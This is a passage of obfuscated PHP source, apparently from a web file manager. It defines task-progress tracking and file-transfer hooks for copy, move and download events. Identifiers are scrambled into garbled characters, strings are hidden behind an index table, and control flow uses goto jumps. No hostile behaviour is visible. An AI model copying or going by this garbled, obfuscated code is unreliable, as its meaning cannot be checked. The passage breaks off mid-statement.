Hook::unbind($BÓ¢Â‹½ ½[1483], array($this, $BÓ¢Â‹½ ½[1524])); goto DãàÛÓÕ÷Ê; a™¼•ù¼ğ: $BÓ¢Â‹½ ½ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->task) { return; } if ($this->task[$BÓ¢Â‹½ ½[1520]]) { self::valueSet($this->task[$BÓ¢Â‹½ ½[393]], !1); } goto bç‘ïĞÄ÷´; fàÍ»‘ß±Ä: } public function update($Eœ¦˜ŸÜ· = 0, $d›šâÂÖ¸ = false) { goto aÑäñ·ŠÊ‘; aÑäñ·ŠÊ‘: $eÌÜ™±İÑå =& $_SERVER[ÒÆ›ÆØÎ¾]; $cˆĞùÖ¾ô =& $this->task; if (!$cˆĞùÖ¾ô) { return; } goto cí¯½×ñÔã; dãÎğÉØß‹: $cˆĞùÖ¾ô[$eÌÜ™±İÑå[702]] = $a°‘‹ÒÙŠ ? $a°‘‹ÒÙŠ : $cˆĞùÖ¾ô[$eÌÜ™±İÑå[702]]; $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1521]] = $f÷ªÙÌÓ™«[$eÌÜ™±İÑå[1521]] ? $f÷ªÙÌÓ™«[$eÌÜ™±İÑå[1521]] : 0; $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1520]] = timeFloat(); goto C¼„ÊÂó÷; D§Éèƒ½ß: $this->updateAfter(); $a¼Š»ÔÌï = 0.2; if (timeFloat() - $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1520]] < $a¼Š»ÔÌï && !$d›šâÂÖ¸) { return; } goto C˜Ï³øŠß¯; C¼„ÊÂó÷: Hook::trigger($eÌÜ™±İÑå[1534], $cˆĞùÖ¾ô); self::valueSet($cˆĞùÖ¾ô[$eÌÜ™±İÑå[393]], $cˆĞùÖ¾ô); goto F¡¤ù—ãâ¾; C˜Ï³øŠß¯: $f÷ªÙÌÓ™« = self::get($cˆĞùÖ¾ô[$eÌÜ™±İÑå[393]]); $a°‘‹ÒÙŠ = $f÷ªÙÌÓ™«[$eÌÜ™±İÑå[702]]; if ($a°‘‹ÒÙŠ == self::STATYS_KILL) { $b©Ò¯—ÁÔÁ = array($eÌÜ™±İÑå[1531] => LNG($eÌÜ™±İÑå[1532]), $eÌÜ™±İÑå[1077] => !1); Cache::set($eÌÜ™±İÑå[1533] . $this->task[$eÌÜ™±İÑå[393]], $b©Ò¯—ÁÔÁ, 30); $this->onKill(); $this->end(); die; } else { if ($a°‘‹ÒÙŠ == self::STATYS_STOP) { $b¾À…ç÷¹ = 2; $f÷ªÙÌÓ™«[$eÌÜ™±İÑå[1521]] += $b¾À…ç÷¹; self::valueSet($cˆĞùÖ¾ô[$eÌÜ™±İÑå[393]], $f÷ªÙÌÓ™«); sleep($b¾À…ç÷¹); $this->update(); return; } } goto dãÎğÉØß‹; cí¯½×ñÔã: $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1027]] += $Eœ¦˜ŸÜ·; $cˆĞùÖ¾ô[$eÌÜ™±İÑå[740]] = timeFloat(); if ($cˆĞùÖ¾ô[$eÌÜ™±İÑå[1012]]) { if ($cˆĞùÖ¾ô[$eÌÜ™±İÑå[1012]] < $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1027]]) { $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1012]] = $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1027]]; } $cæ¤ğäÉ½¨ = timeFloat() - $cˆĞùÖ¾ô[$eÌÜ™±İÑå[741]] - $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1521]]; $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1518]] = $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1027]] / $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1012]]; $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1519]] = $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1027]] / $cæ¤ğäÉ½¨; if ($cˆĞùÖ¾ô[$eÌÜ™±İÑå[1518]] > 0) { $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1522]] = $cæ¤ğäÉ½¨ * (1 - $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1518]]) / $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1518]]; } $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1522]] = $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1522]] <= 0 ? 0 : $cˆĞùÖ¾ô[$eÌÜ™±İÑå[1522]]; } goto D§Éèƒ½ß; F¡¤ù—ãâ¾: } public function onKillSet($Eù†É¹è, $e¢»×›ŠîÛ = array()) { $this->onKillCall = array($Eù†É¹è, $e¢»×›ŠîÛ); } public function onKill() { $aÀö÷¹¨Ë’ =& $_SERVER[ÒÆ›ÆØÎ¾]; self::log($aÀö÷¹¨Ë’[1528] . $this->task[$aÀö÷¹¨Ë’[393]] . $aÀö÷¹¨Ë’[1535]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($EåÚøé™í×) { $Cßè¬†Ø×à =& $_SERVER[ÒÆ›ÆØÎ¾]; Cache::set($Cßè¬†Ø×à[1533] . $this->task[$Cßè¬†Ø×à[393]], $EåÚøé™í×, 60); return $EåÚøé™í×; } public static function get($cÑ“Œå¹Ä›) { return self::valueGet($cÑ“Œå¹Ä›); } public static function listData() { $d‰®æ”ªàÌ = self::valueGet(); return array_sort_by($d‰®æ”ªàÌ, $_SERVER[ÒÆ›ÆØÎ¾][741], !0); } public static function kill($bºíİº–‹é) { return self::changeStatus($bºíİº–‹é, self::STATYS_KILL); } public static function stop($AÇêŞÃ•) { return self::changeStatus($AÇêŞÃ•, self::STATYS_STOP); } public static function restart($F¹Â³¸¬Òá) { return self::changeStatus($F¹Â³¸¬Òá, self::STATYS_RUNNING); } public static function killAll() { $eŠÑ¶¾éôº =& $_SERVER[ÒÆ›ÆØÎ¾]; $Dæ‚Šé¯½Ë = self::listData(); foreach ($Dæ‚Šé¯½Ë as $CÈ÷…ÊŒ°õ) { self::kill($CÈ÷…ÊŒ°õ[$eŠÑ¶¾éôº[393]]); } sleep(2); foreach ($Dæ‚Šé¯½Ë as $CÈ÷…ÊŒ°õ) { self::valueSet($CÈ÷…ÊŒ°õ[$eŠÑ¶¾éôº[393]], !1); } } private static function changeStatus($fÇšÁ…²™†, $cÄ—­‰«¤Ñ) { goto C‡¼áÊíÚ…; C‡¼áÊíÚ…: $DÔ¹Ã³åª… =& $_SERVER[ÒÆ›ÆØÎ¾]; $BÚ´Ó°Ø‡ = self::valueGet($fÇšÁ…²™†); if (!$BÚ´Ó°Ø‡) { return !1; } goto cÄÖïÊƒÏò; cÄÖïÊƒÏò: $BÚ´Ó°Ø‡[$DÔ¹Ã³åª…[702]] = $cÄ—­‰«¤Ñ; self::valueSet($fÇšÁ…²™†, $BÚ´Ó°Ø‡); self::log($DÔ¹Ã³åª…[1536] . $BÚ´Ó°Ø‡[$DÔ¹Ã³åª…[393]] . $DÔ¹Ã³åª…[1537] . $cÄ—­‰«¤Ñ); goto cô ²ÄîÌá; cô ²ÄîÌá: return !0; goto C¼„®è„‰; C¼„®è„‰: } public static function valueGet($Cõâëí¢ = false) { $cª×·¸ ‚‹ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($Cõâëí¢) { $Aïƒ®âˆÄ‡ = Model($cª×·¸ ‚‹[425])->where(array($cª×·¸ ‚‹[93] => $Cõâëí¢, $cª×·¸ ‚‹[29] => $cª×·¸ ‚‹[1538]))->find(); return $Aïƒ®âˆÄ‡ ? json_decode($Aïƒ®âˆÄ‡[$cª×·¸ ‚‹[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($BšğŠ¤½­õ = false) { goto BààµÖ¬çÑ; dù´Ü‡”Ç: $B®æ¾˜²ì× = Model($d‹Ù…Œôéá[425])->where($c–Ôº…Ùªó)->select(); $B®æ¾˜²ì× = $B®æ¾˜²ì× ? $B®æ¾˜²ì× : array(); foreach ($B®æ¾˜²ì× as $A‡Ğåğ°Ò‘ => $f¯•Ì—½¨´) { $B®æ¾˜²ì×[$A‡Ğåğ°Ò‘] = json_decode($f¯•Ì—½¨´[$d‹Ù…Œôéá[372]], !0); } goto fµëÔöÙ—µ; BààµÖ¬çÑ: $d‹Ù…Œôéá =& $_SERVER[ÒÆ›ÆØÎ¾]; $c–Ôº…Ùªó = array($d‹Ù…Œôéá[29] => $d‹Ù…Œôéá[1538]); if ($BšğŠ¤½­õ) { $c–Ôº…Ùªó[$d‹Ù…Œôéá[1517]] = $BšğŠ¤½­õ; } goto dù´Ü‡”Ç; fµëÔöÙ—µ: return $B®æ¾˜²ì×; goto fï‚ˆ°„Ñ¾; fï‚ˆ°„Ñ¾: } public static function valueSet($bºŸñÀ¿ùÓ, $EŞ‘Ô½Ü) { goto CŒš¡ œö; CŒš¡ œö: $C‰•åºèˆ­ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$EŞ‘Ô½Ü) { return Model($C‰•åºèˆ­[425])->where(array($C‰•åºèˆ­[93] => $bºŸñÀ¿ùÓ, $C‰•åºèˆ­[29] => $C‰•åºèˆ­[1538]))->delete(); } $E”ìÊêâÅ = json_encode($EŞ‘Ô½Ü); goto c†‘¥™‚ÊÀ; c†‘¥™‚ÊÀ: if (!$E”ìÊêâÅ) { ob_start(); var_dump($EŞ‘Ô½Ü); $Eâ²Ìê… = ob_get_clean(); self::log($C‰•åºèˆ­[1539] . json_encode_force($Eâ²Ìê…)); } if (!$bºŸñÀ¿ùÓ || !$EŞ‘Ô½Ü[$C‰•åºèˆ­[393]]) { return !1; } $EÍ¬Àí¹°Ê = array($C‰•åºèˆ­[29] => $C‰•åºèˆ­[1538], $C‰•åºèˆ­[1517] => USER_ID, $C‰•åºèˆ­[93] => $bºŸñÀ¿ùÓ, $C‰•åºèˆ­[372] => $E”ìÊêâÅ); goto c½æäÑÇµº; c½æäÑÇµº: Model($C‰•åºèˆ­[425])->add($EÍ¬Àí¹°Ê, array(), !0); goto Cµ…êÍå¯À; Cµ…êÍå¯À: } public static function log($BÚÜñ»òø) { if (!GLOBAL_DEBUG) { return; } write_log($BÚÜñ»òø, $_SERVER[ÒÆ›ÆØÎ¾][1540]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto bÁç©ãå¿Ã; bÁç©ãå¿Ã: $d…½Ø‘ƒ”ï =& $_SERVER[ÒÆ›ÆØÎ¾]; $eà¨Ú›ôÑ =& $this->task; $this->sourceCopyFolder = !1; goto d©Ñ¸ÊòÄ¼; cĞâÈëÜšŞ: Hook::bind($d…½Ø‘ƒ”ï[1553], array($this, $d…½Ø‘ƒ”ï[1554])); Hook::bind($d…½Ø‘ƒ”ï[1555], array($this, $d…½Ø‘ƒ”ï[1556])); Hook::bind($d…½Ø‘ƒ”ï[1557], array($this, $d…½Ø‘ƒ”ï[1558])); goto D·¢ßÓ¤™; D·¢ßÓ¤™: $eà¨Ú›ôÑ[$d…½Ø‘ƒ”ï[1559]] = LNG($d…½Ø‘ƒ”ï[1560]); $eà¨Ú›ôÑ[$d…½Ø‘ƒ”ï[1561]] = 0; $eà¨Ú›ôÑ[$d…½Ø‘ƒ”ï[1562]] = 0; goto bÍ‰†Ğ²­â; d©Ñ¸ÊòÄ¼: Hook::bind($d…½Ø‘ƒ”ï[1541], array($this, $d…½Ø‘ƒ”ï[1542])); Hook::bind($d…½Ø‘ƒ”ï[1101], array($this, $d…½Ø‘ƒ”ï[1543])); Hook::bind($d…½Ø‘ƒ”ï[1544], array($this, $d…½Ø‘ƒ”ï[1545])); goto aØ©Ì×ÃóÖ; bÍ‰†Ğ²­â: $eà¨Ú›ôÑ[$d…½Ø‘ƒ”ï[1014]] = $d…½Ø‘ƒ”ï[33]; $eà¨Ú›ôÑ[$d…½Ø‘ƒ”ï[1563]] = $d…½Ø‘ƒ”ï[33]; $eà¨Ú›ôÑ[$d…½Ø‘ƒ”ï[1564]] = 0; goto c°Û„«ó÷; c°Û„«ó÷: $eà¨Ú›ôÑ[$d…½Ø‘ƒ”ï[1565]] = 0; $eà¨Ú›ôÑ[$d…½Ø‘ƒ”ï[1566]] = 0; if (!$eà¨Ú›ôÑ[$d…½Ø‘ƒ”ï[1423]]) { $eà¨Ú›ôÑ[$d…½Ø‘ƒ”ï[1423]] = LNG($d…½Ø‘ƒ”ï[1567]); } goto DåçÕñÕçá; a¯¿Ù¥îêØ: Hook::bind($d…½Ø‘ƒ”ï[1550], array($this, $d…½Ø‘ƒ”ï[1551])); Hook::bind($d…½Ø‘ƒ”ï[559], array($this, $d…½Ø‘ƒ”ï[1552])); $this->sourceModelCopyFlag = !1; goto cĞâÈëÜšŞ; c®ªèÄÛÖĞ: Hook::bind($d…½Ø‘ƒ”ï[570], array($this, $d…½Ø‘ƒ”ï[1548])); Hook::bind($d…½Ø‘ƒ”ï[537], array($this, $d…½Ø‘ƒ”ï[1549])); Hook::bind($d…½Ø‘ƒ”ï[534], array($this, $d…½Ø‘ƒ”ï[1549])); goto A¯ÛÂĞ­Æ; A¯ÛÂĞ­Æ: Hook::bind($d…½Ø‘ƒ”ï[539], array($this, $d…½Ø‘ƒ”ï[1549])); Hook::bind($d…½Ø‘ƒ”ï[541], array($this, $d…½Ø‘ƒ”ï[1549])); Hook::bind($d…½Ø‘ƒ”ï[543], array($this, $d…½Ø‘ƒ”ï[1549])); goto a¯¿Ù¥îêØ; aØ©Ì×ÃóÖ: Hook::bind($d…½Ø‘ƒ”ï[566], array($this, $d…½Ø‘ƒ”ï[1546])); Hook::bind($d…½Ø‘ƒ”ï[567], array($this, $d…½Ø‘ƒ”ï[1547])); Hook::bind($d…½Ø‘ƒ”ï[569], array($this, $d…½Ø‘ƒ”ï[1548])); goto c®ªèÄÛÖĞ; DåçÕñÕçá: } protected function endAfter() { goto fƒ­õÜ„íÆ; EÏİÏÑÖÙ: Hook::unbind($a¡ó•’©¾ø[1544], array($this, $a¡ó•’©¾ø[1545])); Hook::unbind($a¡ó•’©¾ø[566], array($this, $a¡ó•’©¾ø[1546])); Hook::unbind($a¡ó•’©¾ø[567], array($this, $a¡ó•’©¾ø[1547])); goto Fİ‘Âé†º™; C“§ÊŸÆ˜: Hook::unbind($a¡ó•’©¾ø[534], array($this, $a¡ó•’©¾ø[1549])); Hook::unbind($a¡ó•’©¾ø[539], array($this, $a¡ó•’©¾ø[1549])); Hook::unbind($a¡ó•’©¾ø[541], array($this, $a¡ó•’©¾ø[1549])); goto cÛÒƒŸƒƒÃ; AÇ†ˆ‰¬Ç: Hook::unbind($a¡ó•’©¾ø[1553], array($this, $a¡ó•’©¾ø[1554])); Hook::unbind($a¡ó•’©¾ø[1555], array($this, $a¡ó•’©¾ø[1556])); Hook::unbind($a¡ó•’©¾ø[1557], array($this, $a¡ó•’©¾ø[1558])); goto CŞšó±ß¿; fƒ­õÜ„íÆ: $a¡ó•’©¾ø =& $_SERVER[ÒÆ›ÆØÎ¾]; Hook::unbind($a¡ó•’©¾ø[1541], array($this, $a¡ó•’©¾ø[1542])); Hook::unbind($a¡ó•’©¾ø[1101], array($this, $a¡ó•’©¾ø[1543])); goto EÏİÏÑÖÙ; cÛÒƒŸƒƒÃ: Hook::unbind($a¡ó•’©¾ø[543], array($this, $a¡ó•’©¾ø[1549])); Hook::unbind($a¡ó•’©¾ø[1550], array($this, $a¡ó•’©¾ø[1551])); Hook::unbind($a¡ó•’©¾ø[559], array($this, $a¡ó•’©¾ø[1552])); goto AÇ†ˆ‰¬Ç; Fİ‘Âé†º™: Hook::unbind($a¡ó•’©¾ø[569], array($this, $a¡ó•’©¾ø[1548])); Hook::unbind($a¡ó•’©¾ø[570], array($this, $a¡ó•’©¾ø[1548])); Hook::unbind($a¡ó•’©¾ø[537], array($this, $a¡ó•’©¾ø[1549])); goto C“§ÊŸÆ˜; CŞšó±ß¿: } public function copyMoveStart($Aòª­…î‘, $FÌÕôöâ¯æ, $F†—ßœå‡™, $F”‰”¤ğŒŞ) { goto Dğâç¤ó¿¶; d„¯ŸÛ­Ø: if (substr($FÌÕôöâ¯æ, 0, strlen($d¿ÄƒÃ‚‹Ú)) == $d¿ÄƒÃ‚‹Ú) { return; } if (substr($F”‰”¤ğŒŞ, 0, strlen($d¿ÄƒÃ‚‹Ú)) == $d¿ÄƒÃ‚‹Ú) { return; } $F”âˆÅ…Îâ =& $this->task; goto bì†º®õ»; bì†º®õ»: $F”âˆÅ…Îâ[$DÛ‘¾ÖöÒ[1569]] = KodIO::transferType($Aòª­…î‘, $F†—ßœå‡™); $this->update(); goto dØïäõàŸ; Dğâç¤ó¿¶: $DÛ‘¾ÖöÒ =& $_SERVER[ÒÆ›ÆØÎ¾]; self::log($DÛ‘¾ÖöÒ[1568] . $FÌÕôöâ¯æ . $DÛ‘¾ÖöÒ[67] . $F”‰”¤ğŒŞ); $d¿ÄƒÃ‚‹Ú = rtrim(TEMP_FILES, $DÛ‘¾ÖöÒ[8]); goto d„¯ŸÛ­Ø; dØïäõàŸ: } public function updateAfter() { goto eÔø´šà³‘; eÔø´šà³‘: $aˆê©›î©Œ =& $_SERVER[ÒÆ›ÆØÎ¾]; $céÌö÷É‚ =& $this->task; if (!$céÌö÷É‚[$aˆê©›î©Œ[715]]) { return; } goto eŞ‘ÅƒÖ; b¶¬Úù¯: $céÌö÷É‚[$aˆê©›î©Œ[1518]] = $céÌö÷É‚[$aˆê©›î©Œ[1566]] / $céÌö÷É‚[$aˆê©›î©Œ[715]]; if ($céÌö÷É‚[$aˆê©›î©Œ[1518]] > 0) { $Eª•‘‹ùô÷ = timeFloat() - $céÌö÷É‚[$aˆê©›î©Œ[741]] - $céÌö÷É‚[$aˆê©›î©Œ[1521]]; $céÌö÷É‚[$aˆê©›î©Œ[1522]] = $Eª•‘‹ùô÷ * (1 - $céÌö÷É‚[$aˆê©›î©Œ[1518]]) / $céÌö÷É‚[$aˆê©›î©Œ[1518]]; } goto A”ˆ»Ï­˜³; eŞ‘ÅƒÖ: if ($this->sourceModelCopyFlag) { return; } if ($céÌö÷É‚[$aˆê©›î©Œ[1569]] == $aˆê©›î©Œ[1174]) { return; } if ($céÌö÷É‚[$aˆê©›î©Œ[1569]] == $aˆê©›î©Œ[1085] || $céÌö÷É‚[$aˆê©›î©Œ[1569]] == $aˆê©›î©Œ[107]) { if ($céÌö÷É‚[$aˆê©›î©Œ[1563]]) { $céÌö÷É‚[$aˆê©›î©Œ[1566]] = $céÌö÷É‚[$aˆê©›î©Œ[1565]] + $céÌö÷É‚[$aˆê©›î©Œ[1562]]; } } else { if ($céÌö÷É‚[$aˆê©›î©Œ[1569]] == $aˆê©›î©Œ[1175]) { if ($céÌö÷É‚[$aˆê©›î©Œ[1563]] == $aˆê©›î©Œ[1085]) { $céÌö÷É‚[$aˆê©›î©Œ[1566]] = $céÌö÷É‚[$aˆê©›î©Œ[1565]] + $céÌö÷É‚[$aˆê©›î©Œ[1562]] * 0.5; } else { if ($céÌö÷É‚[$aˆê©›î©Œ[1563]] == $aˆê©›î©Œ[107]) { $céÌö÷É‚[$aˆê©›î©Œ[1566]] = $céÌö÷É‚[$aˆê©›î©Œ[1565]] + $céÌö÷É‚[$aˆê©›î©Œ[1561]] * 0.5 + $céÌö÷É‚[$aˆê©›î©Œ[1562]] * 0.5; } } } } goto b¶¬Úù¯; A”ˆ»Ï­˜³: } public function addPath($Béƒµ¬»‘) { goto DÜù¾ÛŸÕë; aí·µÇç”ï: if ($C†ºÈñ»Ç[$a“ºáªÇ¹Ë[29]] == $a“ºáªÇ¹Ë[193]) { $dô’¯ ì¯Û[$a“ºáªÇ¹Ë[1012]] += 1; } else { $dô’¯ ì¯Û[$a“ºáªÇ¹Ë[1012]] += $C†ºÈñ»Ç[$a“ºáªÇ¹Ë[81]][$a“ºáªÇ¹Ë[79]]; if ($C†ºÈñ»Ç[$a“ºáªÇ¹Ë[395]]) { $dô’¯ ì¯Û[$a“ºáªÇ¹Ë[1012]] += $C†ºÈñ»Ç[$a“ºáªÇ¹Ë[81]][$a“ºáªÇ¹Ë[80]] + 1; } } $dô’¯ ì¯Û[$a“ºáªÇ¹Ë[715]] += $C†ºÈñ»Ç[$a“ºáªÇ¹Ë[78]]; $this->update(); goto Cä…°‹›÷; DÜù¾ÛŸÕë: $a“ºáªÇ¹Ë =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$Béƒµ¬»‘) { return; } $dô’¯ ì¯Û =& $this->task; goto DÇºêò¸Ş; DÇºêò¸Ş: $C†ºÈñ»Ç = IO::infoWithChildren($Béƒµ¬»‘); $D‚¢Œ»ÃŸñ = $dô’¯ ì¯Û[$a“ºáªÇ¹Ë[1570]] ? $dô’¯ ì¯Û[$a“ºáªÇ¹Ë[1570]][$a“ºáªÇ¹Ë[1571]] : 0; $dô’¯ ì¯Û[$a“ºáªÇ¹Ë[1570]] = array($a“ºáªÇ¹Ë[1571] => $D‚¢Œ»ÃŸñ + 1, $a“ºáªÇ¹Ë[413] => $C†ºÈñ»Ç[$a“ºáªÇ¹Ë[28]], $a“ºáªÇ¹Ë[76] => $C†ºÈñ»Ç[$a“ºáªÇ¹Ë[76]], $a“ºáªÇ¹Ë[495] => $C†ºÈñ»Ç[$a“ºáªÇ¹Ë[495]] ? $C†ºÈñ»Ç[$a“ºáªÇ¹Ë[495]] : $C†ºÈñ»Ç[$a“ºáªÇ¹Ë[76]]); goto aí·µÇç”ï; Cä…°‹›÷: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($f¨İ—†¾êÕ) { $cÈÎÑÉÍ£ =& $_SERVER[ÒÆ›ÆØÎ¾]; $aÛš¢®§‚† =& $this->task; $aÛš¢®§‚†[$cÈÎÑÉÍ£[1559]] = $f¨İ—†¾êÕ[$cÈÎÑÉÍ£[28]]; $aÛš¢®§‚†[$cÈÎÑÉÍ£[1014]] = $f¨İ—†¾êÕ[$cÈÎÑÉÍ£[28]]; $this->update(); } public function copyFileStart($fçˆÖĞÕêÉ, $E¹›Í–ìƒƒ, $aÂ‹”ÜĞä, $bÙ¯òó…£, $B†ßˆÖà, $a„…×ÏİæÓ) { goto EÄÅµ™¬ÔÂ; CóÁá”Ùœ: $C²‚²¼šÁ£[$a™ôí»¦[1559]] = $F¾¥ç„²òï; $C²‚²¼šÁ£[$a™ôí»¦[1561]] = (int) $fçˆÖĞÕêÉ->size($E¹›Í–ìƒƒ); $C²‚²¼šÁ£[$a™ôí»¦[1562]] = 0; goto bæ—¥âƒñ; B¿Êèç†—Ñ: $this->update(); goto F¤è™İé’ò; D†©Ú•øÃÜ: $GLOBALS[$a™ôí»¦[1573]] = $B†ßˆÖà; $GLOBALS[$a™ôí»¦[1572]] = $a„…×ÏİæÓ; $C²‚²¼šÁ£ =& $this->task; goto CóÁá”Ùœ; EÄÅµ™¬ÔÂ: $a™ôí»¦ =& $_SERVER[ÒÆ›ÆØÎ¾]; $F¾¥ç„²òï = $B†ßˆÖà; if ($F¾¥ç„²òï == $GLOBALS[$a™ôí»¦[1572]]) { $F¾¥ç„²òï = $GLOBALS[$a™ôí»¦[1573]]; } goto D†©Ú•øÃÜ; bæ—¥âƒñ: $C²‚²¼šÁ£[$a™ôí»¦[1014]] = $a™ôí»¦[33]; $C²‚²¼šÁ£[$a™ôí»¦[1563]] = $a™ôí»¦[33]; $C²‚²¼šÁ£[$a™ôí»¦[1564]] = 0; goto B¿Êèç†—Ñ; F¤è™İé’ò: } public function copyFileEnd($AŞÖ¢Ã™…Ë, $f…ç¥²ËŞµ, $B®ºÄíÕÌ¯, $d±ù²×”×ï, $fÜÛ’„Òœ, $f‚ã…ßÙ…) { $DÄ ©¼”Òš =& $_SERVER[ÒÆ›ÆØÎ¾]; $fŒñÀä·¶á =& $this->task; $fŒñÀä·¶á[$DÄ ©¼”Òš[1562]] = $fŒñÀä·¶á[$DÄ ©¼”Òš[1561]]; $fŒñÀä·¶á[$DÄ ©¼”Òš[1563]] = $DÄ ©¼”Òš[33]; if ($fÜÛ’„Òœ == $fŒñÀä·¶á[$DÄ ©¼”Òš[1559]]) { $fŒñÀä·¶á[$DÄ ©¼”Òš[1565]] += $fŒñÀä·¶á[$DÄ ©¼”Òš[1561]]; $fŒñÀä·¶á[$DÄ ©¼”Òš[1566]] = $fŒñÀä·¶á[$DÄ ©¼”Òš[1565]]; $this->update(1); } else { $this->update(); $fŒñÀä·¶á[$DÄ ©¼”Òš[1562]] = 0; } self::log($DÄ ©¼”Òš[1574] . $f…ç¥²ËŞµ . $DÄ ©¼”Òš[67] . $d±ù²×”×ï . $DÄ ©¼”Òš[229] . $fÜÛ’„Òœ . $DÄ ©¼”Òš[1575] . $fŒñÀä·¶á[$DÄ ©¼”Òš[1559]]); } public function updateFileEnd($Fğ²çãÜÀ, $CÓÉ¤„ŠÆ¬) { goto D¨êêƒ¸¼; D¨êêƒ¸¼: $a£†´½®º =& $_SERVER[ÒÆ›ÆØÎ¾]; $eç‰Ì­ Í¹ =& $this->task; $eç‰Ì­ Í¹[$a£†´½®º[1559]] = $Fğ²çãÜÀ; goto B¸Ã–é¸°İ; eÇÊˆğÖƒ„: $this->update(1); self::log($a£†´½®º[1576] . $Fğ²çãÜÀ); goto C¿“†Óä¥; B¸Ã–é¸°İ: $eç‰Ì­ Í¹[$a£†´½®º[1561]] = $CÓÉ¤„ŠÆ¬; $eç‰Ì­ Í¹[$a£†´½®º[1565]] += $CÓÉ¤„ŠÆ¬; $eç‰Ì­ Í¹[$a£†´½®º[1566]] = $eç‰Ì­ Í¹[$a£†´½®º[1565]]; goto eÇÊˆğÖƒ„; C¿“†Óä¥: } public function sourceModelCopy($F§‹ÓÂ™Š) { goto DÆÄ£ëŞÑ; FÆ¼Şš°À: switch ($DÜä¡´¥Ã•) { case $D¹Æé …á[535]: $bƒôîöÓ¾Û = 1; break; case $D¹Æé …á[538]: $E¯Ú—„“ƒ[$D¹Æé …á[1559]] = $b›èô¸Ñ×î[$D¹Æé …á[28]]; break; case $D¹Æé …á[540]: $bƒôîöÓ¾Û = intval($F§‹ÓÂ™Š[$D¹Æé …á[377]] * 0.4); break; case $D¹Æé …á[542]: $bƒôîöÓ¾Û = intval($F§‹ÓÂ™Š[$D¹Æé …á[377]] * 0.2); break; case $D¹Æé …á[544]: $bƒôîöÓ¾Û = intval($F§‹ÓÂ™Š[$D¹Æé …á[377]] * 0.4); break; } $this->update($bƒôîöÓ¾Û); $this->sourceModelCopyFlag = !1; goto D˜‹ºÍÈ©¾; DÆÄ£ëŞÑ: $D¹Æé …á =& $_SERVER[ÒÆ›ÆØÎ¾]; $DÜä¡´¥Ã• = $F§‹ÓÂ™Š[0]; $b›èô¸Ñ×î = $F§‹ÓÂ™Š[1]; goto Bâõ‹¯‡ì; Bâõ‹¯‡ì: $E¯Ú—„“ƒ =& $this->task; $this->sourceModelCopyFlag = !0; $bƒôîöÓ¾Û = 0; goto FÆ¼Şš°À; D˜‹ºÍÈ©¾: } public function sourceRemove($fßªòµê, $dì‡¶ÓÉ¼…) { $föäØÚË§Æ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->sourceModelCopyFlag = !0; $eÈòëÒ—Õ© = 1; if (isset($fßªòµê[$föäØÚË§Æ[81]])) { $eÈòëÒ—Õ© = $fßªòµê[$föäØÚË§Æ[81]][$föäØÚË§Æ[79]] + $fßªòµê[$föäØÚË§Æ[81]][$föäØÚË§Æ[80]] + 1; } $this->update($eÈòëÒ—Õ©); $this->sourceModelCopyFlag = !1; } public function sourceMove($fÍ¡İËËÂ) { $this->sourceRemove($fÍ¡İËËÂ, !1); } public function curlProgress($Eø»·Ã™·Š, $A‰Ú¯¢Á£Ä, $B×²…ÇÎ›ˆ, $dº½Ö«ğ°, $d©ÌÌ®œÈ) { $aìù„‹µô¡ =& $_SERVER[ÒÆ›ÆØÎ¾]; $då’Ê¬Œ±¥ =& $this->task; if ($d©ÌÌ®œÈ > 0) { $då’Ê¬Œ±¥[$aìù„‹µô¡[1014]] = $aìù„‹µô¡[1577]; $då’Ê¬Œ±¥[$aìù„‹µô¡[1563]] = $aìù„‹µô¡[107]; if ($då’Ê¬Œ±¥[$aìù„‹µô¡[1561]]) { $då’Ê¬Œ±¥[$aìù„‹µô¡[1562]] = $d©ÌÌ®œÈ; } if ($då’Ê¬Œ±¥[$aìù„‹µô¡[1564]]) { $då’Ê¬Œ±¥[$aìù„‹µô¡[1562]] = $d©ÌÌ®œÈ + $då’Ê¬Œ±¥[$aìù„‹µô¡[1564]]; } } else { if ($B×²…ÇÎ›ˆ > 0) { if ($då’Ê¬Œ±¥[$aìù„‹µô¡[1561]] == $A‰Ú¯¢Á£Ä) { $då’Ê¬Œ±¥[$aìù„‹µô¡[1562]] = $B×²…ÇÎ›ˆ; $då’Ê¬Œ±¥[$aìù„‹µô¡[1014]] = $aìù„‹µô¡[1578]; $då’Ê¬Œ±¥[$aìù„‹µô¡[1563]] = $aìù„‹µô¡[1085]; } } } $this->update(); } public function curlProgressStart($fƒù¢ˆˆå•) { } public function curlProgressEnd($A’Ê²œØ’¶) { goto D‡­„ä‚ó†; D‡­„ä‚ó†: $f¶‰¤ÂÙâ =& $_SERVER[ÒÆ›ÆØÎ¾]; $BæĞ´âù =& $this->task; $fœ¥¡£ŠË÷ = curl_getinfo($A’Ê²œØ’¶); goto e—ôÉãÅ¸Ş; BÍÍ™œéÎì: $this->update(); goto e³ºÆºõù; e—ôÉãÅ¸Ş: $E°ŠœåÂÅ = 